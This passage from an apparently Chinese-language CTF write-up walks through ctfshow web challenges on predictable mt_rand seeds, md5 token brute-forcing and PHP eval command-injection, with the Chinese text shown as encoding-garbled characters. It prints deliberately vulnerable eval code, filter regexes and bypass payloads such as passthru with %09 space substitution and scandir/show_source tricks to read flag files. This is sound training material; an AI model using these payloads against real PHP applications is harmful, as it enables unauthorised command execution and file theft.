        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ†æä¸€ä¸‹ä»£ç ï¼š<br>å¦‚æœå­˜åœ¨ä¸€ä¸ªtokenå€¼ï¼Œä¸”tokenå€¼æ˜¯è¢«md5åŠ å¯†è¿‡çš„ï¼Œå¦‚æœifä¸­çš„æ¡ä»¶æ»¡è¶³ï¼Œåˆ™æ‰“å°å‡ºflagã€‚éœ€è¦ä¼ é€’ä¸€ä¸ª tokenå€¼ï¼Œå†™è„šæœ¬çˆ†ç ´ï¼Œåœ¨è¿™é‡Œæˆ‘ç”¨PHPè¯­è¨€ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">10000</span><span class="token punctuation">:</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ€è·¯æ˜¯å› ä¸ºtokenå­˜åœ¨ä¸€ä¸ªæ•´æ•°å€¼ï¼Œä½†ç°åœ¨ä¸çŸ¥é“æ˜¯å¤šå°‘ï¼Œæˆ‘å‡è®¾æ˜¯åœ¨10000ä¹‹å†…ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œå¾—åˆ°<strong>422å’Œ1202</strong>ç„¶ååœ¨urlååŠ ä¸Š <strong>?token&#x3D;1202</strong> æˆ– <strong>?token&#x3D;422</strong> å›è½¦åå¾—åˆ°flagã€‚<br><strong>æˆ‘è®¤ä¸ºä»¥åä¼šæœ‰å¾ˆå¤šé¢˜è¦ç”¨è„šæœ¬ã€‚</strong> æ¯”å¦‚pythonæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚</p>
<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:26:39
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 13:53:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>mt_srandé€šè¿‡seedç»™mt_randæ’­ç§ï¼Œç„¶åmt_randé€šè¿‡<a href="https://baike.baidu.com/item/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95/22800014">æ¢…æ£®æ—‹è½¬ç®—æ³•</a>ç”Ÿæˆä¼ªéšæœºæ•°ã€‚å¦‚æœæŒ‡å®šseedï¼Œé‚£ä¹ˆmt_srandæ’­å‡ºæ¥çš„ç§å­æ˜¯å›ºå®šçš„ï¼Œmt_randç”Ÿæˆçš„ä¼ªéšæœºæ•°ä¹Ÿæ˜¯å›ºå®šçš„ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/10e71b69aefc4ce6af505059950068dd.png" alt="24"><br>getä¼ å‚ä¼ å…¥?r&#x3D;1122388967,å¾—åˆ°flag.</p>
<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>æ‰“å¼€åæœ‰ä»¥ä¸‹ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:56:57
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 15:47:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>mt_scrand(seed)è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœºæ•°ã€‚<br>è¿™é‡Œæ²¡æœ‰æ˜ç¡®ç»™å‡ºseedï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨å·¥å…·é€†æ¨å‡ºseedã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡ºï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„rä¸º0ï¼Œé‚£ä¹ˆ$randä¸ºç¬¬ä¸€ä¸ªéšæœºæ•°çš„è´Ÿæ•°ï¼Œå¹¶ä¸”å› ä¸ºéé›¶ï¼Œåœ¨ifåˆ¤æ–­ä¸­ä¼šåœ¨elseä¸­è¾“å‡ºï¼Œå› æ­¤æˆ‘ä»¬å…ˆGETè¾“å…¥?r&#x3D;0ï¼Œå¾—åˆ°ç¬¬ä¸€ä¸ªéšæœºæ•°çš„è´Ÿæ•°ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20875749074848f196d6b7b1fdc4ef49.png" alt="25"><br>è™šæ‹Ÿæœºæ‰“å¼€ç»ˆç«¯è¾“å…¥lsæŸ¥çœ‹ï¼Œå¾—åˆ°æ–‡ä»¶php_mt_seedï¼Œè¾“å…¥* .&#x2F;php_mt_seedç¬¬ä¸€ä¸ªéšæœºæ•°*<br>bpæŠ“åŒ…repeateråsendä¸ºphp7.0ä»¥ä¸Šç‰ˆæœ¬<br><img src="https://img-blog.csdnimg.cn/7d7b0b2bcd994279b5a64993de43eb05.png" alt="25"><br>è¿™é‡Œæœ‰ä¸‰ä¸ªï¼ˆç”¨php7.0ç‰ˆæœ¬ä»¥ä¸Šè¿è¡Œä»£ç )</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">3095355977</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸‰ç§å¯èƒ½éƒ½è¯•ä¸€ä¸‹ï¼Œ<br><img src="https://img-blog.csdnimg.cn/b91295d5b03f466fa046b44d34f332cd.png" alt="25"><br>é€šè¿‡ä»£ç :</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä»¤r&#x3D;1374935140å¯ä»¥ä½¿å¾—!$randä¸ºçœŸ,ç„¶åæ‰§è¡Œifè¯­å¥ï¼Œå¦‚æœcookieä¼ å…¥å€¼æ­£ç¡®ï¼Œå¾—å‡ºflagã€‚<br>åˆ©ç”¨hackbarè¿›è¡Œgetä¼ å‚ï¼Œè¿›è¡Œcookieä¼ å‚å¾—åˆ°flagã€‚</p>
<h2 id="å‘½ä»¤æ‰§è¡Œç¯‡"><a href="#å‘½ä»¤æ‰§è¡Œç¯‡" class="headerlink" title="å‘½ä»¤æ‰§è¡Œç¯‡"></a>å‘½ä»¤æ‰§è¡Œç¯‡</h2><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>é€šè¿‡GETä¼ å‚çš„æ–¹å¼ä¼ å…¥cï¼Œä¼ å…¥cçš„å†…å®¹ä¸­è¿‡æ»¤æ‰äº†flag system  php cat sort shell è‹±æ–‡å¥å·ï¼ˆ.ï¼‰ ç©ºæ ¼ï¼ˆ ï¼‰ å•å¼•å·ï¼ˆâ€™ï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ‰¾ä¸€äº›å’Œä»–ä»¬åŠŸèƒ½ç›¸ä¼¼çš„å‘½ä»¤ã€‚<br>       æ¯”å¦‚ï¼š<br>ä¸**system()<strong>åŠŸèƒ½ç›¸ä¼¼çš„å‘½ä»¤æœ‰</strong>exec()<strong>ã€</strong>passthru()<strong>ã€</strong>shell_exec()**ã€‚<br>ä¸catå‘½ä»¤åŠŸèƒ½ç›¸ä¼¼çš„å‘½ä»¤ï¼š</p>
<p><em>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br>head:æŸ¥çœ‹å¤´å‡ è¡Œ<br>tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>tail:æŸ¥çœ‹å°¾å‡ è¡Œ<br>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>sort:å¯ä»¥æŸ¥çœ‹<br>uniq:å¯ä»¥æŸ¥çœ‹<br>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br>sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;æŠ¥é”™å‡ºæ–‡ä»¶å†…å®¹</em></p>
<p>ç©ºæ ¼è¢«è¿‡æ»¤æ‰å¯ä»¥ç”¨%09ä»£æ›¿ã€‚<br>æˆ‘ä»¬getä¼ å…¥**?c&#x3D;passthru(â€œlsâ€);**<br><img src="https://img-blog.csdnimg.cn/b63bb7e45461489299cab133c3bc4d75.png" alt="31"><br>ç„¶åé‡æ–°ä¼ å…¥**?c&#x3D;passthru(â€œtac%09fla*â€);<em><em>å¾—åˆ°flagã€‚<br><strong>è¿˜å¯ä»¥ï¼š</strong><br>       1 &gt;ä½¿ç”¨evalåµŒå¥—ã€‚å…·ä½“å‚æ•°ï¼špassthru ç»“åˆ%09<br>å…¶ä¸­%09ç»•è¿‡ç©ºæ ¼ ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac%09fla</em>â€œ); è¿™é‡Œéœ€è¦æ³¨æ„æ‹¬å·çš„é—­åˆï¼Œ&amp;çš„è¿æ¥ã€‚<br>       2&gt; ä½¿ç”¨pos(localeconv)æ¥è·å–å°æ•°ç‚¹<br><strong>localeconv</strong>å¯ä»¥è¿”å›åŒ…æ‹¬å°æ•°ç‚¹åœ¨å†…çš„ä¸€ä¸ªæ•°ç»„ï¼›</em><em>pos<strong>å»å–å‡ºæ•°ç»„ä¸­å½“å‰ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯å°æ•°ç‚¹ã€‚ <strong>scandir</strong>å¯ä»¥ç»“åˆå®ƒæ‰«æå½“å‰ç›®å½•å†…å®¹ã€‚ <strong>?c&#x3D;print_r(scandir(pos(localeconv())));</strong> å¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰flag.php é€šè¿‡</strong>array_reverse<strong>æŠŠæ•°ç»„é€†åºï¼Œé€šè¿‡nextå–åˆ°ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ ï¼Œä¹Ÿå³flag.php ç„¶å</strong>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));*</em></p>
<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¢«è¿‡æ»¤çš„æ›´å¤šäº†</p>
